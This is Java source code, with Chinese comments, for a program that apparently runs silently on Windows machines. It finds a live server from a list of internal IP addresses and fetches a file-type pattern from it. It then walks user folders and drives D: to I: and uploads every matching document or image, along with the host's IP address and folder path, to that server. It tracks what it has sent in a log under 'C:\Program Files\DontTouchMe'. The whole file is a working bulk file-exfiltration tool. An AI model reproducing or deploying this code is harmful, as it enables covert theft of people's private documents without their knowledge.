package fileUpXP;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.nio.charset.Charset;
import java.nio.file.AccessDeniedException;
import java.nio.file.FileSystems;
import java.nio.file.FileVisitResult;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.PathMatcher;
import java.nio.file.Paths;
import java.nio.file.SimpleFileVisitor;
import java.nio.file.attribute.BasicFileAttributes;
import java.nio.file.attribute.FileTime;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Enumeration;
import java.util.Properties;

import org.apache.hc.client5.http.classic.methods.HttpGet;
import org.apache.hc.client5.http.classic.methods.HttpPost;
import org.apache.hc.client5.http.entity.mime.FileBody;
import org.apache.hc.client5.http.entity.mime.MultipartEntityBuilder;
import org.apache.hc.client5.http.entity.mime.StringBody;
import org.apache.hc.client5.http.impl.classic.CloseableHttpClient;
import org.apache.hc.client5.http.impl.classic.CloseableHttpResponse;
import org.apache.hc.client5.http.impl.classic.HttpClients;
import org.apache.hc.core5.http.ContentType;
import org.apache.hc.core5.http.HttpEntity;
import org.apache.hc.core5.http.io.entity.EntityUtils;

public class fileUpXP {

	public static String url = "";
	public static String logpath = "C:\\Program Files\\DontTouchMe";
	public static Properties properties = null;

//	public static final Queue<String[]> queue = new ConcurrentLinkedQueue<String[]>();

	public static void main(String[] args) {

		//设置服务器地址
		ArrayList<String> urlPath = new ArrayList<String>();
		urlPath.add("http://192.168.1.195:8080/");
		urlPath.add("http://172.16.2.44:8080/");
		urlPath.add("http://172.16.3.63:8080/");
		urlPath.add("http://172.16.6.63:8080/");
		urlPath.add("http://172.16.7.100:8080/");

		int urlIndex = 0;
		for (; urlIndex < urlPath.size(); urlIndex++) {
			if (url != "") {
				break;
			}
			if (isServerRun(urlPath.get(urlIndex))) {
				url = urlPath.get(urlIndex);
				break;
			}
		}

		// 所有的url都没有服务
		if (urlIndex == urlPath.size()) {
			System.exit(0);
		}

		// 获取配置文件
		getProp();

		ArrayList<String> filepath = new ArrayList<String>();

		ArrayList<String> diskpath = new ArrayList<String>();
		// 其他版本的用户文件
		diskpath.add("C:\\Users");
		// xp的用户文件位置
		diskpath.add("C:\\Documents and Settings");
		diskpath.add("D:\\");
		diskpath.add("E:\\");
		diskpath.add("F:\\");
		diskpath.add("G:\\");
		diskpath.add("H:\\");
		diskpath.add("I:\\");

		for (int i = 0; i < diskpath.size(); i++) {
			String s = diskpath.get(i);
			File f = new File(s);
			if (f.exists()) {
				filepath.add(s);
			}
		}

		fileUpXP fu = new fileUpXP();
		try {

			for (int i = 0; i < filepath.size(); i++) {
				fu.visitFile3(filepath.get(i));
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	/**
	 * 递归遍历，正则模式
	 *
	 * @throws IOException IO异常
	 */
	public void visitFile3(String path) throws IOException {

		// 获取key对应的value值
		String reg = properties.getProperty("reg");
		// (?i)忽略大小写，(?:)标记该匹配组不应被捕获
//		String reg = "regex:.*\\.(?i)(?:docx|doc|xls|xlsx|ppt|pptx|jpg|png|jpeg|pdf)";
//		String reg = "regex:.*\\.(?i)(?:docx|doc)";
//	  String path = "D:\\sts-4.9.0.RELEASE";

		final PathMatcher pathMatcher = FileSystems.getDefault().getPathMatcher(reg);

		Files.walkFileTree(Paths.get(path), new SimpleFileVisitor<Path>() {
			@Override
			public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {
				// 如果文件大于50M则不读取
				if (attrs.size() >= 52428800 || attrs.size() <= 1024) {
					return FileVisitResult.CONTINUE;
				}
				if (pathMatcher.matches(file)) {
					// file为文件路径 "~$为word文档临时文件"
					if (file.toString().contains("~$") || file.toString().contains("$")) {
						return FileVisitResult.CONTINUE;
					}
//		    		  System.out.println(file);		//D:\sts-4.9.0.RELEASE\测试文档.docx

					DateFormat df = new SimpleDateFormat("yyyy年MM月dd日HH时mm分ss秒");
					FileTime time = attrs.lastModifiedTime();

					Date d = new Date(time.toMillis());
					String utctime = df.format(d);

					// 上传文件
					upload(file.toString(), utctime);
//					String[] content = new String[2];
//					content[0] = file.toString();
//					content[1] = utctime;
//					queue.add(content);
				}
				return FileVisitResult.CONTINUE;
			}

			// 增加失败处理，直接过滤
			@Override
			public FileVisitResult visitFileFailed(Path file, IOException exc) throws IOException {
				if (exc instanceof AccessDeniedException) {
					return FileVisitResult.SKIP_SUBTREE;
				}
				return super.visitFileFailed(file, exc);
			}
		});
	}

	public void upload(String localFile, String utctime) {

		// 文件目录位置 C:\Users\Administrator\Desktop
		String dirPath = localFile.substring(0, localFile.lastIndexOf("\\"));
		dirPath = dirPath.replaceAll(":", "");

		// 往服务器询问
//		if (hasFile(localFile, utctime)) {
//			System.out.println("文件已经存在");
//			return;
//		}

		// 询问本地
		if (readFromFile(logpath + "\\" + utctime.substring(0, 11) + ".log", localFile + utctime) != null) {
			System.out.println("文件已经存在");
			return;
		}

		CloseableHttpClient httpClient = null;
		CloseableHttpResponse response = null;
		try {
			httpClient = HttpClients.createDefault();

			// 把一个普通参数和文件上传给下面这个地址 是一个servlet
			HttpPost httpPost = new HttpPost(url + "uploadFile");
//			HttpPost httpPost = new HttpPost("http://127.0.0.1:8080/uploadFile");

			// 把文件转换成流对象FileBody
			File f = new File(localFile);
			FileBody bin = new FileBody(f);

			String fileName = f.getName();
			String filepreffix = fileName.substring(0, fileName.lastIndexOf("."));
			String filesuffix = fileName.substring(fileName.lastIndexOf(".") + 1);
//	      System.out.println(filesuffix);
//	      System.out.println(filepreffix);

			StringBody dirpath = new StringBody(dirPath, ContentType.create("text/plain", Charset.forName("UTF-8")));

			// 文件名
			StringBody preffix = new StringBody(filepreffix,
					ContentType.create("text/plain", Charset.forName("UTF-8")));
			// 文件后缀
			StringBody suffix = new StringBody(filesuffix, ContentType.create("text/plain", Charset.forName("UTF-8")));

			// 获取本机IP地址
			String ip = getIpAddress();

			StringBody ipaddr = new StringBody(ip, ContentType.create("text/plain", Charset.forName("UTF-8")));

			StringBody time = new StringBody(utctime, ContentType.create("text/plain", Charset.forName("UTF-8")));

			HttpEntity reqEntity = MultipartEntityBuilder.create()
					// 相当于<input type="file" name="file"/>
					.addPart("file", bin)

					// 相当于<input type="text" name="userName" value=userName>
					.addPart("preffix", preffix).addPart("suffix", suffix).addPart("ip", ipaddr).addPart("time", time)
					.addPart("dirpath", dirpath).build();

			httpPost.setEntity(reqEntity);

			// 发起请求 并返回请求的响应
			response = httpClient.execute(httpPost);

			// 获取响应对象
			HttpEntity resEntity = response.getEntity();
			if (resEntity != null) {
				// 打印响应长度
//	        System.out.println("Response content length: " + resEntity.getContentLength());
				// 打印响应内容
//	        System.out.println(EntityUtils.toString(resEntity, Charset.forName("UTF-8")));
			}

			// 销毁
			EntityUtils.consume(resEntity);
			writeIntoFile(logpath + "\\" + utctime.substring(0, 11) + ".log", localFile + utctime, true);
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			try {
				if (response != null) {
					response.close();
				}
			} catch (IOException e) {
				e.printStackTrace();
			}

			try {
				if (httpClient != null) {
					httpClient.close();
				}
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}

	// 获取IP地址
	public String getIpAddress() {
		try {
			Enumeration<NetworkInterface> allNetInterfaces = NetworkInterface.getNetworkInterfaces();
			InetAddress ip = null;
			while (allNetInterfaces.hasMoreElements()) {
				NetworkInterface netInterface = (NetworkInterface) allNetInterfaces.nextElement();
				if (netInterface.isLoopback() || netInterface.isVirtual() || !netInterface.isUp()) {
					continue;
				} else {
					Enumeration<InetAddress> addresses = netInterface.getInetAddresses();
					while (addresses.hasMoreElements()) {
						ip = addresses.nextElement();
						if (ip != null && ip instanceof Inet4Address) {
							return ip.getHostAddress();
						}
					}
				}
			}
		} catch (Exception e) {
			System.err.println("IP地址获取失败" + e.toString());
			return "";
		}
		return "";
	}

	// 上传前先判断文件是否已经存在
	public boolean hasFile(String localFile, String utctime) {
		CloseableHttpClient httpClient = null;
		CloseableHttpResponse response = null;
		boolean result = true;
		try {
			httpClient = HttpClients.createDefault();

			// 把一个普通参数和文件上传给下面这个地址 是一个servlet
			HttpPost httpPost = new HttpPost(url + "hasFile");
//			HttpPost httpPost = new HttpPost("http://127.0.0.1:8080/hasFile");

			// 把文件转换成流对象FileBody
			File f = new File(localFile);
			String fileName = f.getName();
			String filepreffix = fileName.substring(0, fileName.lastIndexOf("."));
			String filesuffix = fileName.substring(fileName.lastIndexOf(".") + 1);

			// 文件目录位置
			String dirPath = localFile.substring(0, localFile.lastIndexOf("\\"));
			dirPath = dirPath.replaceAll(":", "");

			StringBody dirpath = new StringBody(dirPath, ContentType.create("text/plain", Charset.forName("UTF-8")));

			// 文件名
			StringBody preffix = new StringBody(filepreffix,
					ContentType.create("text/plain", Charset.forName("UTF-8")));
			// 文件后缀
			StringBody suffix = new StringBody(filesuffix, ContentType.create("text/plain", Charset.forName("UTF-8")));

			// 获取本机IP地址
			String ip = getIpAddress();

			StringBody ipaddr = new StringBody(ip, ContentType.create("text/plain", Charset.forName("UTF-8")));

			StringBody time = new StringBody(utctime, ContentType.create("text/plain", Charset.forName("UTF-8")));

			HttpEntity reqEntity = MultipartEntityBuilder.create()

					// 相当于<input type="text" name="userName" value=userName>
					.addPart("preffix", preffix).addPart("suffix", suffix).addPart("ip", ipaddr).addPart("time", time)
					.addPart("dirpath", dirpath).build();

			httpPost.setEntity(reqEntity);

			// 发起请求 并返回请求的响应
			response = httpClient.execute(httpPost);

			// 获取响应对象
			HttpEntity resEntity = response.getEntity();
			if (resEntity != null) {
				// 打印响应长度
//	        System.out.println("Response content length: " + resEntity.getContentLength());
				// 打印响应内容
//				System.out.println(EntityUtils.toString(resEntity, Charset.forName("UTF-8")));
				result = Boolean.valueOf(EntityUtils.toString(resEntity, Charset.forName("UTF-8"))).booleanValue();
			}

			// 销毁
			EntityUtils.consume(resEntity);
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			try {
				if (response != null) {
					response.close();
				}
			} catch (IOException e) {
				e.printStackTrace();
			}

			try {
				if (httpClient != null) {
					httpClient.close();
				}
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		return result;
	}

	/**
	 *
	 * @param filePath 文件路径的字符串表示形式
	 * @param KeyWords 查找包含某个关键字的信息：非null为带关键字查询；null为全文显示
	 * @return 当文件存在时，返回字符串；当文件不存在时，返回null
	 */
	public static String readFromFile(String filePath, String KeyWords) {
		if (KeyWords == null) {
			return null;
		}
		StringBuffer stringBuffer = null;
		File file = new File(filePath);
		if (file.exists()) {
			stringBuffer = new StringBuffer();
			FileReader fileReader = null;
			BufferedReader bufferedReader = null;
			String temp = "";
			try {
				fileReader = new FileReader(file);
				bufferedReader = new BufferedReader(fileReader);
				while ((temp = bufferedReader.readLine()) != null) {
					if (temp.contains(KeyWords)) {
						stringBuffer.append(temp + "\r\n");
						break;
					}
				}
			} catch (FileNotFoundException e) {
				// e.printStackTrace();
			} catch (IOException e) {
				// e.printStackTrace();
			} finally {
				try {
					fileReader.close();
				} catch (IOException e) {
					// e.printStackTrace();
				}
				try {
					bufferedReader.close();
				} catch (IOException e) {
					// e.printStackTrace();
				}
			}
		} else {
			// 先过滤掉文件名
			int index = filePath.lastIndexOf("\\");
			String dir = filePath.substring(0, index);
			// 创建除文件的路径
			File fileDir = new File(dir);
			fileDir.mkdirs();

			FileWriter fileWriter = null;

			try {
				System.out.println(filePath);
				file = new File(filePath);
				file.createNewFile();
				// 创建文件后写入第一行内容
				fileWriter = new FileWriter(file, false);
				fileWriter.write("FileUpLog");
				fileWriter.flush();
			} catch (IOException e) {
				e.printStackTrace();
			} finally {
				try {
					fileWriter.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
		}
		if (stringBuffer != null && stringBuffer.length() > 0) {
			return stringBuffer.toString();
		} else {
			return null;
		}
	}

	/**
	 * 将指定字符串写入文件。如果给定的文件路径不存在，将新建文件后写入。
	 * 
	 * @param log      要写入文件的字符串
	 * @param filePath 文件路径的字符串表示形式，目录的层次分隔可以是“/”也可以是“\\”
	 * @param isAppend true：追加到文件的末尾；false：以覆盖原文件的方式写入
	 */

	public static void writeIntoFile(String filePath, String log, boolean isAppend) {
		// 将logs写入文件
		FileWriter fileWriter = null;
		try {
			File file = new File(filePath);
			fileWriter = new FileWriter(file, isAppend);
			fileWriter.write("\r\n" + log);
			fileWriter.flush();
		} catch (IOException e) {
			e.printStackTrace();
		} finally {
			try {
				fileWriter.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}

	public static boolean isServerRun(String serverUrl) {
		boolean result = false;
		CloseableHttpClient httpclient = null;
		CloseableHttpResponse response = null;
		try {
			httpclient = HttpClients.createDefault();
			HttpGet httpGet = new HttpGet(serverUrl + "uploadIndex");
			response = httpclient.execute(httpGet);
			HttpEntity entity = response.getEntity();
//			if (entity != null) {
//				// 打印响应内容
//				System.out.println(EntityUtils.toString(entity, Charset.forName("UTF-8")));
//			}
			// do something useful with the response body
			// and ensure it is fully consumed
			EntityUtils.consume(entity);
			result = true;
		} catch (Exception e) {
			e.printStackTrace();
			System.out.println(e.getMessage());
		} finally {
			try {
				if (response != null) {
					response.close();
				}
			} catch (IOException e) {
				e.printStackTrace();
			}

			try {
				if (httpclient != null) {
					httpclient.close();
				}
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		return result;
	}

	// 获取配置文件
	public static void getProp() {

		String path = System.getProperty("user.dir") + "\\" + "up.properties";

		CloseableHttpClient httpclient = null;
		CloseableHttpResponse response = null;
		try {
			httpclient = HttpClients.createDefault();
			HttpGet httpGet = new HttpGet(url + "getProp");
			response = httpclient.execute(httpGet);
			HttpEntity entity = response.getEntity();

			if (entity != null) {
				InputStream is = entity.getContent();
				FileOutputStream fout = new FileOutputStream(new File(path));
				byte[] buffer = new byte[1024];
				int len = 0;
				while ((len = (is.read(buffer))) > -1) {
					fout.write(buffer, 0, len);
				}
			}

			properties = new Properties();
			// 使用InPutStream流读取properties文件
			BufferedReader bufferedReader = new BufferedReader(new FileReader(path));
			properties.load(bufferedReader);
			// do something useful with the response body
			// and ensure it is fully consumed
			EntityUtils.consume(entity);
		} catch (Exception e) {
			e.printStackTrace();
			System.out.println(e.getMessage());
		} finally {
			try {
				if (response != null) {
					response.close();
				}
			} catch (IOException e) {
				e.printStackTrace();
			}

			try {
				if (httpclient != null) {
					httpclient.close();
				}
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}
}
